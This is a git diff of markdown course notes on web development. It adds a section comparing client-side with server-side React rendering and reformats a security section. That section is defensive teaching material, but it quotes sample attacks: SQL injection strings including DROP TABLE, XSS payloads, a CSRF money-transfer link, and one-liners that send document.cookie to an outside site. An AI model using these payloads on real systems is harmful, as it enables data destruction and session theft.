@@ -10,6 +10,7 @@
   - [**Section 5: Performance Part 2**](#section-5-performance-part-2)
   - [**Section 6: Testing**](#section-6-testing)
   - [**Section 7: TypeScript**](#section-7-typescript)
+  - [**Section 8: SPA vs Server Side Rendering**](#section-8-spa-vs-server-side-rendering)
   - [**Section 9: Security**](#section-9-security)
 
 ## **Section 2: SSH**
@@ -418,9 +419,64 @@
 
 **[⬆ back to top](#table-of-contents)**
 
+## **Section 8: SPA vs Server Side Rendering**
+
+- SPA - Client Side Rendering
+  - More JS is send to client on initial request
+  - Longer for JS to get send and execute
+  - SEO performance
+  - Critical Render Path
+    - Barebone HTML - Nothing to be rendered
+    - Wait for JS to arrive
+    - Wait for JS to execute
+    - Webpage is loaded
+- Server Side Rendering
+  - Critical Render Path
+    - Server response a fully rendered page initial
+    - Wait for JS to arrive
+    - Wait for JS to execute
+    - Webpage is loaded
+- Server Side Rendering React
+  - Server: ReactDOMServer.renderToNodeStream()
+    - New version. Performance Improvement
+  - Server: ReactDOMServer.renderToString()
+  - Client: Receive a fully rendered page initial
+  - Client: ReactDOM.hydrate()
+  - Client: Attached event listeners to the fully rendered page
+```
+// server.js - ssr
+import express from "express";
+import React from "react";
+import fs from "fs";
+import { renderToString } from "react-dom/server";
+import App from "/App";
+
+const app = express();
+app.use(express.static('/public'));
+
+const robots = JSON.parse(fs.readFileSync('/public/robots.json'));
+const RobotfriendsApp = React.createElement(App);
+app.get('/', (request, response) => {
+  response.render('index', {
+    content: renderToString(RobotfriendsApp({ data: robots }))
+  })
+});
+```
+- CSR vs SSR Part 2
+  - CSR Pros: Rich Interactions, Faster Response and Web Applications
+  - CSR Cons: Low SEO potential, Longer initial load
+  - SSR Pros: Static Sites, SEO and Initial Page Load
+  - SSR Cons: Full Page Reloads, Slower page rendering, # Requests to server
+- SSR React Libraries
+  - [Gatsby](https://www.gatsbyjs.org/) - Static sites
+  - [NEXT.js](https://nextjs.org/) - build dynamic applications
+
+**[⬆ back to top](#table-of-contents)**
+
 ## **Section 9: Security**
 
 - Star of Security
+
   - Injections
   - 3rd party libraries
   - Logging
@@ -434,9 +490,12 @@
   - Authentication
 
 - Injections
+
   - [SQL Injection](https://www.hacksplaining.com/exercises/sql-injection)
+
     - eg. Add in password field: 'or 1=1--
     - eg. Insert into a new row: '; DROP TABLE users; --
+
     ```CREATE TABLE sqlinjection (
         id serial PRIMARY KEY,
         email text UNIQUE NOT NULL
@@ -445,10 +504,12 @@
     INSERT INTO sqlinjection (email)
     VALUES (; DROP TABLE sqlinjection; --);
     ```
+
   - [PostgreSQL](https://www.postgresql.org/download/macosx/)
   - [PostgreSQL GUI tool for macOS](http://www.psequel.com)
   - Code injection Exercise: Start Security-server, then security-client
-  - Key in ```<img src='/' onerror="alert('boom')">```
+  - Key in `<img src='/' onerror="alert('boom')">`
+
 - Solution:
   - Sanitize input with white and black list
   - Parametrize Queries: Use object relational mapper
@@ -457,15 +518,15 @@
       if(name === number)
     }
   ```
-   - [Knex.js](http://knexjs.org/) or other ORMS
+  - [Knex.js](http://knexjs.org/) or other ORMS
 - 3rd party libraries
   - [The Node Security Platform service is shutting down 9/30](https://blog.npmjs.org/post/175511531085/the-node-security-platform-service-is-shutting)
   - [Announcing npm@6](https://medium.com/npm-inc/announcing-npm-6-5d0b1799a905)
-    - ```npm audit```
+    - `npm audit`
   - [Snyk](https://github.com/snyk/snyk)
-    - ```sudo npm i -g snyk```
-    - ```snyk auth```
-    - ```snyk test```
+    - `sudo npm i -g snyk`
+    - `snyk auth`
+    - `snyk test`
 - Logging
   - [Insufficient Logging & Monitoring](https://owasp.org/www-project-top-ten/OWASP_Top_Ten_2017/Top_10-2017_A10-Insufficient_Logging%252526Monitoring)
   - [winston](https://github.com/winstonjs/winston)
@@ -480,25 +541,25 @@
     - [Cross-site scripting for dummies](https://medium.com/hackernoon/cross-site-scripting-for-dummies-be30f76fad09)
     - Hacker inject malicious code into blog post
     - Malicious Code is run when user visit the blog post
-    - Example: ```window.location = 'www.zzz.com?cookie=' + document.cookie```
+    - Example: `window.location = 'www.zzz.com?cookie=' + document.cookie`
     - Send user cookie to to malicious website www.zzz.com
   - CSRF: Cross Site Request Forgery
     - Client <-> Server <-> Database
     - Client <-> 3rd Party API
     - Users log in to their netbank.com
     - Send them a malicious with the following code in the link
-    - Example: ```<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>```
-    - Users click the link and send AttackerA $100
+    - Example: `<a href="http://netbank.com/transfer.do?acct=AttackerA&amount=$100">Read more!</a>`
+    - Users click the link and send AttackerA \$100
     - Example 2:
-    - ```fetch('//httpbin.org/post',{method:'POST',body:document.cookie})```
+    - `fetch('//httpbin.org/post',{method:'POST',body:document.cookie})`
     - Send cookie of the current login website to a malicious site
     - [httpbin.org](https://httpbin.org)
     - Solution: Block in document's Content Security Policy
   - XSS and CSRF Summary
     - Sanitize input
     - No eval()
-    - No document.write() 
-      - Example: ```document.write('<script>alert(1)</script>')```
+    - No document.write()
+      - Example: `document.write('<script>alert(1)</script>')`
     - [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)
     - Secure + HTTPOnly [Cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies)
       - Secure: Cookies send over https
@@ -506,7 +567,7 @@
     - [csurf](https://github.com/expressjs/csurf)
 - Code Secrets
   - [Environmental Variables](https://create-react-app.dev/docs/adding-custom-environment-variables/)
-    - Add into .env. Example: ```REACT_APP_API_URL=https://swapi.py4e.com/api```
+    - Add into .env. Example: `REACT_APP_API_URL=https://swapi.py4e.com/api`
   - Commit History
     - use .gitignore file to avoid commit secret or password to github
     - [Do NOT commit password to github](https://github.com/search?q=remove+password&type=Commits)
@@ -531,7 +592,7 @@
   - Client <-> 3rd Party API
   - [ratelimiter](https://github.com/tj/node-ratelimiter)
   - How to prevent bad actors?
--Authentication
+    -Authentication
   - Session-Based Authentication
   - Token-Based Authentication
   - Exercise: #4 - Optional [Hacking](https://www.hacksplaining.com/lessons)
